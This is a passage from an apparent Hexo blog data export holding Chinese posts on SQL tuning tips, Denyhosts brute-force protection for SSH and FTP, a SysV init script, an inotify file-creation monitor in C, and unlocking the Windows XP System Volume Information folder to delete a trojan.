游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。<br>28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。<br>29、尽量避免大事务操作，提高系统并发能力。<br>30、尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。<br>&lt;转载与web开发者&gt;</p>\n"},{"title":"使用Denyhosts防止SSHD和VSFTPD暴力破解","date":"2015-11-21T14:23:01.000Z","_content":"Denyhosts防止暴力破解主要是根据登录的日志/var/log/secure（centos为例），登录失败次数超过一定的阀值将IP写入/etc/hosts.deny文件中。文件格式如下：\n<pre>\n#服务名称：ip地址\nsshd: 180.97.239.49\nALL: 180.78.180.186\n</pre>\nDenyhosts是专门用于防止SSHD登录，默认也是防止sshd登录的配置；如果想让vsftpd也添加一个安全的墙，需要在配置中添加以下信息，主要是格式化了匹配的正则表达式。\n<pre>\ndenyhosts.cfg：\nSSHD_FORMAT_REGEX=.* (sshd.*:|[sshd]|vsftpd.*:) (?P<message>.*)\nUSERDEF_FAILED_ENTRY_REGEX=authentication failure.* ruser=(?P<user>S+) rhost=(?P<host>S+)\nBLOCK_SERVICE  = ALL\n</pre>\n修改后，需要重启denghosts服务。\nvsftpd如果使用这种机制需要开启tcp_wrappers（默认是开启的）\n<pre>\ntcp_wrappers=YES\n</pre>","source":"_posts/使用Denyhosts防止SSHD和VSFTPD暴力破解.md","raw":"title: 使用Denyhosts防止SSHD和VSFTPD暴力破解\ncategories: [网络安全]\ntags: []\ndate: 2015-11-21 22:23:01\n---\nDenyhosts防止暴力破解主要是根据登录的日志/var/log/secure（centos为例），登录失败次数超过一定的阀值将IP写入/etc/hosts.deny文件中。文件格式如下：\n<pre>\n#服务名称：ip地址\nsshd: 180.97.239.49\nALL: 180.78.180.186\n</pre>\nDenyhosts是专门用于防止SSHD登录，默认也是防止sshd登录的配置；如果想让vsftpd也添加一个安全的墙，需要在配置中添加以下信息，主要是格式化了匹配的正则表达式。\n<pre>\ndenyhosts.cfg：\nSSHD_FORMAT_REGEX=.* (sshd.*:|[sshd]|vsftpd.*:) (?P<message>.*)\nUSERDEF_FAILED_ENTRY_REGEX=authentication failure.* ruser=(?P<user>S+) rhost=(?P<host>S+)\nBLOCK_SERVICE  = ALL\n</pre>\n修改后，需要重启denghosts服务。\nvsftpd如果使用这种机制需要开启tcp_wrappers（默认是开启的）\n<pre>\ntcp_wrappers=YES\n</pre>","slug":"使用Denyhosts防止SSHD和VSFTPD暴力破解","published":1,"updated":"2023-04-22T05:38:44.983Z","_id":"clgrjlxlh00ao7opi6iychspu","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Denyhosts防止暴力破解主要是根据登录的日志&#x2F;var&#x2F;log&#x2F;secure（centos为例），登录失败次数超过一定的阀值将IP写入&#x2F;etc&#x2F;hosts.deny文件中。文件格式如下：</p>\n<pre>\n#服务名称：ip地址\nsshd: 180.97.239.49\nALL: 180.78.180.186\n</pre>\n<p>Denyhosts是专门用于防止SSHD登录，默认也是防止sshd登录的配置；如果想让vsftpd也添加一个安全的墙，需要在配置中添加以下信息，主要是格式化了匹配的正则表达式。</p>\n<pre>\ndenyhosts.cfg：\nSSHD_FORMAT_REGEX=.* (sshd.*:|[sshd]|vsftpd.*:) (?P<message>.*)\nUSERDEF_FAILED_ENTRY_REGEX=authentication failure.* ruser=(?P<user>S+) rhost=(?P<host>S+)\nBLOCK_SERVICE  = ALL\n</pre>\n<p>修改后，需要重启denghosts服务。<br>vsftpd如果使用这种机制需要开启tcp_wrappers（默认是开启的）</p>\n<pre>\ntcp_wrappers=YES\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>Denyhosts防止暴力破解主要是根据登录的日志&#x2F;var&#x2F;log&#x2F;secure（centos为例），登录失败次数超过一定的阀值将IP写入&#x2F;etc&#x2F;hosts.deny文件中。文件格式如下：</p>\n<pre>\n#服务名称：ip地址\nsshd: 180.97.239.49\nALL: 180.78.180.186\n</pre>\n<p>Denyhosts是专门用于防止SSHD登录，默认也是防止sshd登录的配置；如果想让vsftpd也添加一个安全的墙，需要在配置中添加以下信息，主要是格式化了匹配的正则表达式。</p>\n<pre>\ndenyhosts.cfg：\nSSHD_FORMAT_REGEX=.* (sshd.*:|[sshd]|vsftpd.*:) (?P<message>.*)\nUSERDEF_FAILED_ENTRY_REGEX=authentication failure.* ruser=(?P<user>S+) rhost=(?P<host>S+)\nBLOCK_SERVICE  = ALL\n</pre>\n<p>修改后，需要重启denghosts服务。<br>vsftpd如果使用这种机制需要开启tcp_wrappers（默认是开启的）</p>\n<pre>\ntcp_wrappers=YES\n</pre>"},{"title":"写linux服务","date":"2011-02-27T13:19:00.000Z","_content":"<p>一般系统的运行级别是在 &nbsp; /etc/inittab &nbsp; 里面指定的。有一行是类似 <br />id:5:initdefault: <br />或者 <br />id:3:initdefault: <br />的，这里的数字就是系统的默认运行级别。假设是 &nbsp; 5。 <br /><br />启动服务的是依靠 &nbsp; /etc/init.d/ &nbsp; 下的脚本启动的。这些都是普通的 &nbsp; shell &nbsp; 脚本，系统在调用的时候，如果是启动服务，则传入 &nbsp; start &nbsp; 作为参数；stop &nbsp; 表示停止；restart &nbsp; 表示重启。因此你可以写一个脚本，比如简单的如这样： <br /><br />#!/bin/sh <br /><br />ARG=$1 <br /><br />case &nbsp; $ARG &nbsp; in &nbsp; <br />start): <br />nohup &nbsp; /path/to/your/program &nbsp; &nbsp; &amp; <br />;; <br />stop): <br />pkill &nbsp; program <br />;; <br />restart): <br />pkill &nbsp; program <br />nohup &nbsp; /path/to/your/program &nbsp; &amp; <br />;; <br />esac <br /><br />把这个脚本放在 &nbsp; /etc/init.d &nbsp; 里面，譬如 &nbsp; /etc/init.d/your_prog <br />然后加入相应运行级别的链接：在 &nbsp; 5 &nbsp; 级启动则 &nbsp; <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc5.d/S100your_prog <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc0.d/K100your_prog <br />这里两个数字都可以用对应目录里最大的数字，因为没有别的服务依赖你的服务。 <br />这样表示，当系统进入 &nbsp; init &nbsp; level &nbsp; 5 &nbsp; 的时候启动你的程序，进入 &nbsp; init &nbsp; level &nbsp; 0 &nbsp; 的时候停止你的程序。 <br /><br /></p>","source":"_posts/写linux服务.md","raw":"title: 写linux服务\ncategories: [Linux]\ntags: []\ndate: 2011-02-27 21:19:00\n---\n<p>一般系统的运行级别是在 &nbsp; /etc/inittab &nbsp; 里面指定的。有一行是类似 <br />id:5:initdefault: <br />或者 <br />id:3:initdefault: <br />的，这里的数字就是系统的默认运行级别。假设是 &nbsp; 5。 <br /><br />启动服务的是依靠 &nbsp; /etc/init.d/ &nbsp; 下的脚本启动的。这些都是普通的 &nbsp; shell &nbsp; 脚本，系统在调用的时候，如果是启动服务，则传入 &nbsp; start &nbsp; 作为参数；stop &nbsp; 表示停止；restart &nbsp; 表示重启。因此你可以写一个脚本，比如简单的如这样： <br /><br />#!/bin/sh <br /><br />ARG=$1 <br /><br />case &nbsp; $ARG &nbsp; in &nbsp; <br />start): <br />nohup &nbsp; /path/to/your/program &nbsp; &nbsp; &amp; <br />;; <br />stop): <br />pkill &nbsp; program <br />;; <br />restart): <br />pkill &nbsp; program <br />nohup &nbsp; /path/to/your/program &nbsp; &amp; <br />;; <br />esac <br /><br />把这个脚本放在 &nbsp; /etc/init.d &nbsp; 里面，譬如 &nbsp; /etc/init.d/your_prog <br />然后加入相应运行级别的链接：在 &nbsp; 5 &nbsp; 级启动则 &nbsp; <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc5.d/S100your_prog <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc0.d/K100your_prog <br />这里两个数字都可以用对应目录里最大的数字，因为没有别的服务依赖你的服务。 <br />这样表示，当系统进入 &nbsp; init &nbsp; level &nbsp; 5 &nbsp; 的时候启动你的程序，进入 &nbsp; init &nbsp; level &nbsp; 0 &nbsp; 的时候停止你的程序。 <br /><br /></p>","slug":"写linux服务","published":1,"updated":"2023-04-22T05:38:45.006Z","_id":"clgrjlxli00aq7opifmu5a1tt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一般系统的运行级别是在 &nbsp; /etc/inittab &nbsp; 里面指定的。有一行是类似 <br />id:5:initdefault: <br />或者 <br />id:3:initdefault: <br />的，这里的数字就是系统的默认运行级别。假设是 &nbsp; 5。 <br /><br />启动服务的是依靠 &nbsp; /etc/init.d/ &nbsp; 下的脚本启动的。这些都是普通的 &nbsp; shell &nbsp; 脚本，系统在调用的时候，如果是启动服务，则传入 &nbsp; start &nbsp; 作为参数；stop &nbsp; 表示停止；restart &nbsp; 表示重启。因此你可以写一个脚本，比如简单的如这样： <br /><br />#!/bin/sh <br /><br />ARG=$1 <br /><br />case &nbsp; $ARG &nbsp; in &nbsp; <br />start): <br />nohup &nbsp; /path/to/your/program &nbsp; &nbsp; &amp; <br />;; <br />stop): <br />pkill &nbsp; program <br />;; <br />restart): <br />pkill &nbsp; program <br />nohup &nbsp; /path/to/your/program &nbsp; &amp; <br />;; <br />esac <br /><br />把这个脚本放在 &nbsp; /etc/init.d &nbsp; 里面，譬如 &nbsp; /etc/init.d/your_prog <br />然后加入相应运行级别的链接：在 &nbsp; 5 &nbsp; 级启动则 &nbsp; <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc5.d/S100your_prog <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc0.d/K100your_prog <br />这里两个数字都可以用对应目录里最大的数字，因为没有别的服务依赖你的服务。 <br />这样表示，当系统进入 &nbsp; init &nbsp; level &nbsp; 5 &nbsp; 的时候启动你的程序，进入 &nbsp; init &nbsp; level &nbsp; 0 &nbsp; 的时候停止你的程序。 <br /><br /></p>","site":{"data":{}},"excerpt":"","more":"<p>一般系统的运行级别是在 &nbsp; /etc/inittab &nbsp; 里面指定的。有一行是类似 <br />id:5:initdefault: <br />或者 <br />id:3:initdefault: <br />的，这里的数字就是系统的默认运行级别。假设是 &nbsp; 5。 <br /><br />启动服务的是依靠 &nbsp; /etc/init.d/ &nbsp; 下的脚本启动的。这些都是普通的 &nbsp; shell &nbsp; 脚本，系统在调用的时候，如果是启动服务，则传入 &nbsp; start &nbsp; 作为参数；stop &nbsp; 表示停止；restart &nbsp; 表示重启。因此你可以写一个脚本，比如简单的如这样： <br /><br />#!/bin/sh <br /><br />ARG=$1 <br /><br />case &nbsp; $ARG &nbsp; in &nbsp; <br />start): <br />nohup &nbsp; /path/to/your/program &nbsp; &nbsp; &amp; <br />;; <br />stop): <br />pkill &nbsp; program <br />;; <br />restart): <br />pkill &nbsp; program <br />nohup &nbsp; /path/to/your/program &nbsp; &amp; <br />;; <br />esac <br /><br />把这个脚本放在 &nbsp; /etc/init.d &nbsp; 里面，譬如 &nbsp; /etc/init.d/your_prog <br />然后加入相应运行级别的链接：在 &nbsp; 5 &nbsp; 级启动则 &nbsp; <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc5.d/S100your_prog <br />ln &nbsp; -s &nbsp; /etc/init.d/your_prog &nbsp; /etc/rc0.d/K100your_prog <br />这里两个数字都可以用对应目录里最大的数字，因为没有别的服务依赖你的服务。 <br />这样表示，当系统进入 &nbsp; init &nbsp; level &nbsp; 5 &nbsp; 的时候启动你的程序，进入 &nbsp; init &nbsp; level &nbsp; 0 &nbsp; 的时候停止你的程序。 <br /><br /></p>"},{"title":"使用inotify 监控文件创建、修改","date":"2013-07-17T14:36:27.000Z","_content":"例子为：使用inotify 监控文件创建，可用于安全防护，在创建文件时，检测文件内容，以及后续的操作。\n监控类型在/usr/include/sys/inotify.h头文件查看\n<pre>\n#define IN_ACCESS        0x00000001     /* File was accessed.  */\n#define IN_MODIFY        0x00000002     /* File was modified.  */\n#define IN_ATTRIB        0x00000004     /* Metadata changed.  */\n#define IN_CLOSE_WRITE   0x00000008     /* Writtable file was closed.  */\n#define IN_CLOSE_NOWRITE 0x00000010     /* Unwrittable file closed.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE) /* Close.  */\n#define IN_OPEN          0x00000020     /* File was opened.  */\n#define IN_MOVED_FROM    0x00000040     /* File was moved from X.  */\n#define IN_MOVED_TO      0x00000080     /* File was moved to Y.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO) /* Moves.  */\n#define IN_CREATE        0x00000100     /* Subfile was created.  */\n#define IN_DELETE        0x00000200     /* Subfile was deleted.  */\n#define IN_DELETE_SELF   0x00000400     /* Self was deleted.  */\n#define IN_MOVE_SELF     0x00000800     /* Self was moved.  */\n/* Events sent by the kernel.  */\n#define IN_UNMOUNT       0x00002000     /* Backing fs was unmounted.  */\n#define IN_Q_OVERFLOW    0x00004000     /* Event queued overflowed.  */\n#define IN_IGNORED       0x00008000     /* File was ignored.  */\n/* Helper events.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)    /* Close.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO)          /* Moves.  */\n/* Special flags.  */\n#define IN_ONLYDIR       0x01000000     /* Only watch the path if it is a\n                                           directory.  */\n#define IN_DONT_FOLLOW   0x02000000     /* Do not follow a sym link.  */\n#define IN_EXCL_UNLINK   0x04000000     /* Exclude events on unlinked\n                                           objects.  */\n#define IN_MASK_ADD      0x20000000     /* Add to the mask of an already\n#define IN_ONESHOT       0x80000000     /* Only send event once.  */\n/* All events which a program can wait on.  */\n#define IN_ALL_EVENTS    (IN_ACCESS | IN_MODIFY | IN_ATTRIB | IN_CLOSE_WRITE\n                          | IN_CLOSE_NOWRITE | IN_OPEN | IN_MOVED_FROM\n                          | IN_MOVED_TO | IN_CREATE | IN_DELETE\n                          | IN_DELETE_SELF | IN_MOVE_SELF)\n</pre>\n监控制定目录下面创建文件和目录\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n#define\tEVENT_SIZE ( sizeof(struct inotify_event) )\n#define\tBUFF_LEN ( 1024 * ( EVENT_SIZE + 16 ))\nint main(void)\n{\n\tint\tlength, i = 0;\n\tint\tfd;\n\tint\twd;\n\tchar\tbuff[BUFF_LEN];\n\tfd = inotify_init();\n\tif ( fd < 0) {\n\t\tperror(\"inotify_init error:\");\n\t\texit(-1);\n\t}\n\twd = inotify_add_watch(fd, \"/home/key1088/code/c/test\", IN_CREATE);\n\tstruct inotify_event *event;\n\twhile ( 1 ) {\n\t\tmemset(buff, 0x00, sizeof(buff));\n\t\tlength = read(fd, buff, BUFF_LEN);\n\t\tif ( length < 0) {\n\t\t\tperror(\"read:\");\n\t\t}\n\t\tevent = ( struct inotify_event * ) &buff[ i ];\n\t\tif ( event->len ) {\n\t\t\tif (event->mask & IN_CREATE) {\n\t\t\t\tif(event->mask & IN_ISDIR) {\n\t\t\t\t\tprintf(\"create dir,dirname=[%s]n\", event->name);\n\t\t\t\t}else{\n\t\t\t\t\tprintf(\"create file,filename=[%s]n\", event->name);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tinotify_rm_watch(fd, wd);\n\tclose(fd);\n\treturn 0;\n}\n</pre>\n参考：http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/","source":"_posts/使用inotify-监控文件创建、修改.md","raw":"title: 使用inotify 监控文件创建、修改\ncategories: [程序设计,Linux,C编程]\ntags: []\ndate: 2013-07-17 22:36:27\n---\n例子为：使用inotify 监控文件创建，可用于安全防护，在创建文件时，检测文件内容，以及后续的操作。\n监控类型在/usr/include/sys/inotify.h头文件查看\n<pre>\n#define IN_ACCESS        0x00000001     /* File was accessed.  */\n#define IN_MODIFY        0x00000002     /* File was modified.  */\n#define IN_ATTRIB        0x00000004     /* Metadata changed.  */\n#define IN_CLOSE_WRITE   0x00000008     /* Writtable file was closed.  */\n#define IN_CLOSE_NOWRITE 0x00000010     /* Unwrittable file closed.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE) /* Close.  */\n#define IN_OPEN          0x00000020     /* File was opened.  */\n#define IN_MOVED_FROM    0x00000040     /* File was moved from X.  */\n#define IN_MOVED_TO      0x00000080     /* File was moved to Y.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO) /* Moves.  */\n#define IN_CREATE        0x00000100     /* Subfile was created.  */\n#define IN_DELETE        0x00000200     /* Subfile was deleted.  */\n#define IN_DELETE_SELF   0x00000400     /* Self was deleted.  */\n#define IN_MOVE_SELF     0x00000800     /* Self was moved.  */\n/* Events sent by the kernel.  */\n#define IN_UNMOUNT       0x00002000     /* Backing fs was unmounted.  */\n#define IN_Q_OVERFLOW    0x00004000     /* Event queued overflowed.  */\n#define IN_IGNORED       0x00008000     /* File was ignored.  */\n/* Helper events.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)    /* Close.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO)          /* Moves.  */\n/* Special flags.  */\n#define IN_ONLYDIR       0x01000000     /* Only watch the path if it is a\n                                           directory.  */\n#define IN_DONT_FOLLOW   0x02000000     /* Do not follow a sym link.  */\n#define IN_EXCL_UNLINK   0x04000000     /* Exclude events on unlinked\n                                           objects.  */\n#define IN_MASK_ADD      0x20000000     /* Add to the mask of an already\n#define IN_ONESHOT       0x80000000     /* Only send event once.  */\n/* All events which a program can wait on.  */\n#define IN_ALL_EVENTS    (IN_ACCESS | IN_MODIFY | IN_ATTRIB | IN_CLOSE_WRITE\n                          | IN_CLOSE_NOWRITE | IN_OPEN | IN_MOVED_FROM\n                          | IN_MOVED_TO | IN_CREATE | IN_DELETE\n                          | IN_DELETE_SELF | IN_MOVE_SELF)\n</pre>\n监控制定目录下面创建文件和目录\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n#define\tEVENT_SIZE ( sizeof(struct inotify_event) )\n#define\tBUFF_LEN ( 1024 * ( EVENT_SIZE + 16 ))\nint main(void)\n{\n\tint\tlength, i = 0;\n\tint\tfd;\n\tint\twd;\n\tchar\tbuff[BUFF_LEN];\n\tfd = inotify_init();\n\tif ( fd < 0) {\n\t\tperror(\"inotify_init error:\");\n\t\texit(-1);\n\t}\n\twd = inotify_add_watch(fd, \"/home/key1088/code/c/test\", IN_CREATE);\n\tstruct inotify_event *event;\n\twhile ( 1 ) {\n\t\tmemset(buff, 0x00, sizeof(buff));\n\t\tlength = read(fd, buff, BUFF_LEN);\n\t\tif ( length < 0) {\n\t\t\tperror(\"read:\");\n\t\t}\n\t\tevent = ( struct inotify_event * ) &buff[ i ];\n\t\tif ( event->len ) {\n\t\t\tif (event->mask & IN_CREATE) {\n\t\t\t\tif(event->mask & IN_ISDIR) {\n\t\t\t\t\tprintf(\"create dir,dirname=[%s]n\", event->name);\n\t\t\t\t}else{\n\t\t\t\t\tprintf(\"create file,filename=[%s]n\", event->name);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tinotify_rm_watch(fd, wd);\n\tclose(fd);\n\treturn 0;\n}\n</pre>\n参考：http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/","slug":"使用inotify-监控文件创建、修改","published":1,"updated":"2023-04-22T05:38:44.988Z","_id":"clgrjlxlj00as7opi1n7g7o8q","comments":1,"layout":"post","photos":[],"link":"","content":"<p>例子为：使用inotify 监控文件创建，可用于安全防护，在创建文件时，检测文件内容，以及后续的操作。<br>监控类型在&#x2F;usr&#x2F;include&#x2F;sys&#x2F;inotify.h头文件查看</p>\n<pre>\n#define IN_ACCESS        0x00000001     /* File was accessed.  */\n#define IN_MODIFY        0x00000002     /* File was modified.  */\n#define IN_ATTRIB        0x00000004     /* Metadata changed.  */\n#define IN_CLOSE_WRITE   0x00000008     /* Writtable file was closed.  */\n#define IN_CLOSE_NOWRITE 0x00000010     /* Unwrittable file closed.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE) /* Close.  */\n#define IN_OPEN          0x00000020     /* File was opened.  */\n#define IN_MOVED_FROM    0x00000040     /* File was moved from X.  */\n#define IN_MOVED_TO      0x00000080     /* File was moved to Y.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO) /* Moves.  */\n#define IN_CREATE        0x00000100     /* Subfile was created.  */\n#define IN_DELETE        0x00000200     /* Subfile was deleted.  */\n#define IN_DELETE_SELF   0x00000400     /* Self was deleted.  */\n#define IN_MOVE_SELF     0x00000800     /* Self was moved.  */\n/* Events sent by the kernel.  */\n#define IN_UNMOUNT       0x00002000     /* Backing fs was unmounted.  */\n#define IN_Q_OVERFLOW    0x00004000     /* Event queued overflowed.  */\n#define IN_IGNORED       0x00008000     /* File was ignored.  */\n/* Helper events.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)    /* Close.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO)          /* Moves.  */\n/* Special flags.  */\n#define IN_ONLYDIR       0x01000000     /* Only watch the path if it is a\n                                           directory.  */\n#define IN_DONT_FOLLOW   0x02000000     /* Do not follow a sym link.  */\n#define IN_EXCL_UNLINK   0x04000000     /* Exclude events on unlinked\n                                           objects.  */\n#define IN_MASK_ADD      0x20000000     /* Add to the mask of an already\n#define IN_ONESHOT       0x80000000     /* Only send event once.  */\n/* All events which a program can wait on.  */\n#define IN_ALL_EVENTS    (IN_ACCESS | IN_MODIFY | IN_ATTRIB | IN_CLOSE_WRITE\n                          | IN_CLOSE_NOWRITE | IN_OPEN | IN_MOVED_FROM\n                          | IN_MOVED_TO | IN_CREATE | IN_DELETE\n                          | IN_DELETE_SELF | IN_MOVE_SELF)\n</pre>\n<p>监控制定目录下面创建文件和目录</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n#define\tEVENT_SIZE ( sizeof(struct inotify_event) )\n#define\tBUFF_LEN ( 1024 * ( EVENT_SIZE + 16 ))\nint main(void)\n{\n    int\tlength, i = 0;\n    int\tfd;\n    int\twd;\n    char\tbuff[BUFF_LEN];\n    fd = inotify_init();\n    if ( fd < 0) {\n        perror(\"inotify_init error:\");\n        exit(-1);\n    }\n    wd = inotify_add_watch(fd, \"/home/key1088/code/c/test\", IN_CREATE);\n    struct inotify_event *event;\n    while ( 1 ) {\n        memset(buff, 0x00, sizeof(buff));\n        length = read(fd, buff, BUFF_LEN);\n        if ( length < 0) {\n            perror(\"read:\");\n        }\n        event = ( struct inotify_event * ) &buff[ i ];\n        if ( event->len ) {\n            if (event->mask & IN_CREATE) {\n                if(event->mask & IN_ISDIR) {\n                    printf(\"create dir,dirname=[%s]n\", event->name);\n                }else{\n                    printf(\"create file,filename=[%s]n\", event->name);\n                }\n            }\n        }\n    }\n    inotify_rm_watch(fd, wd);\n    close(fd);\n    return 0;\n}\n</pre>\n<p>参考：<a href=\"http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/\">http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>例子为：使用inotify 监控文件创建，可用于安全防护，在创建文件时，检测文件内容，以及后续的操作。<br>监控类型在&#x2F;usr&#x2F;include&#x2F;sys&#x2F;inotify.h头文件查看</p>\n<pre>\n#define IN_ACCESS        0x00000001     /* File was accessed.  */\n#define IN_MODIFY        0x00000002     /* File was modified.  */\n#define IN_ATTRIB        0x00000004     /* Metadata changed.  */\n#define IN_CLOSE_WRITE   0x00000008     /* Writtable file was closed.  */\n#define IN_CLOSE_NOWRITE 0x00000010     /* Unwrittable file closed.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE) /* Close.  */\n#define IN_OPEN          0x00000020     /* File was opened.  */\n#define IN_MOVED_FROM    0x00000040     /* File was moved from X.  */\n#define IN_MOVED_TO      0x00000080     /* File was moved to Y.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO) /* Moves.  */\n#define IN_CREATE        0x00000100     /* Subfile was created.  */\n#define IN_DELETE        0x00000200     /* Subfile was deleted.  */\n#define IN_DELETE_SELF   0x00000400     /* Self was deleted.  */\n#define IN_MOVE_SELF     0x00000800     /* Self was moved.  */\n/* Events sent by the kernel.  */\n#define IN_UNMOUNT       0x00002000     /* Backing fs was unmounted.  */\n#define IN_Q_OVERFLOW    0x00004000     /* Event queued overflowed.  */\n#define IN_IGNORED       0x00008000     /* File was ignored.  */\n/* Helper events.  */\n#define IN_CLOSE         (IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)    /* Close.  */\n#define IN_MOVE          (IN_MOVED_FROM | IN_MOVED_TO)          /* Moves.  */\n/* Special flags.  */\n#define IN_ONLYDIR       0x01000000     /* Only watch the path if it is a\n                                           directory.  */\n#define IN_DONT_FOLLOW   0x02000000     /* Do not follow a sym link.  */\n#define IN_EXCL_UNLINK   0x04000000     /* Exclude events on unlinked\n                                           objects.  */\n#define IN_MASK_ADD      0x20000000     /* Add to the mask of an already\n#define IN_ONESHOT       0x80000000     /* Only send event once.  */\n/* All events which a program can wait on.  */\n#define IN_ALL_EVENTS    (IN_ACCESS | IN_MODIFY | IN_ATTRIB | IN_CLOSE_WRITE\n                          | IN_CLOSE_NOWRITE | IN_OPEN | IN_MOVED_FROM\n                          | IN_MOVED_TO | IN_CREATE | IN_DELETE\n                          | IN_DELETE_SELF | IN_MOVE_SELF)\n</pre>\n<p>监控制定目录下面创建文件和目录</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n#define\tEVENT_SIZE ( sizeof(struct inotify_event) )\n#define\tBUFF_LEN ( 1024 * ( EVENT_SIZE + 16 ))\nint main(void)\n{\n    int\tlength, i = 0;\n    int\tfd;\n    int\twd;\n    char\tbuff[BUFF_LEN];\n    fd = inotify_init();\n    if ( fd < 0) {\n        perror(\"inotify_init error:\");\n        exit(-1);\n    }\n    wd = inotify_add_watch(fd, \"/home/key1088/code/c/test\", IN_CREATE);\n    struct inotify_event *event;\n    while ( 1 ) {\n        memset(buff, 0x00, sizeof(buff));\n        length = read(fd, buff, BUFF_LEN);\n        if ( length < 0) {\n            perror(\"read:\");\n        }\n        event = ( struct inotify_event * ) &buff[ i ];\n        if ( event->len ) {\n            if (event->mask & IN_CREATE) {\n                if(event->mask & IN_ISDIR) {\n                    printf(\"create dir,dirname=[%s]n\", event->name);\n                }else{\n                    printf(\"create file,filename=[%s]n\", event->name);\n                }\n            }\n        }\n    }\n    inotify_rm_watch(fd, wd);\n    close(fd);\n    return 0;\n}\n</pre>\n<p>参考：<a href=\"http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/\">http://www.ibm.com/developerworks/cn/linux/l-ubuntu-inotify/</a></p>\n"},{"title":"删除 System Volume Information 里内容","date":"2010-06-11T07:54:00.000Z","_content":"今天我的红伞报d:System Volume Information的木文件是木马。我郁闷不知道什么时候中的，但是杀不了，拒绝访问！默认权限是system，杀软无法访问，更无法删除。<br />官方介绍的方法。。反正不能系统还原，直接去掉了。。。<br /> 使用 FAT32 文件系统的 Microsoft Windows XP Professional 或  Windows XP Home Edition<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中双击“System Volume  Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在域中使用 NTFS 文件系统的 Windows XP  Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>单击“确定”。</li> <li>在根文件夹中右键单击“System Volume  Information”文件夹，然后单击“共享和安全”。</li> <li>单击“安全”选项卡。</li> <li>单击“添加”，然后键入要向其授予 该文件夹访问权限的用户的名称。选择相应的帐户位置（本地帐户或域帐户）。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 根文件夹中双击“System Volume Information”文件夹以将其打开。</li></ol><a href=\"http://support.microsoft.com/kb/309531/zh-cn#top\"><br /></a>在工作组或独立计算机上使用 NTFS 文件系统的  Windows XP Professional<ol> <li>单击“开始”，然后单击“我的电脑”。</li> <li>在“工具”菜单上，单击“文件夹选 项”。</li> <li>在“查看”选项卡上，单击“显示所有文件和文件夹”。</li> <li>清除“隐藏受保护的操作系统文件(推荐)”复选框。当系 统提示您确认是否更改时，请单击“是”。</li> <li>清除“使用简单文件共享(推荐)”复选框。</li> <li>单击“确定”。</li> <li>在 根文件夹中右键单击“System Volume Information”文件夹，然后单击“属性”。</li> <li>单击“安全”选项卡。</li> <li>单 击“添加”，然后键入要向其授予该文件夹访问权限的用户的名称。通常，这是您登录时使用的帐户。单击“确定”，然后再次单击“确定”。</li> <li>在 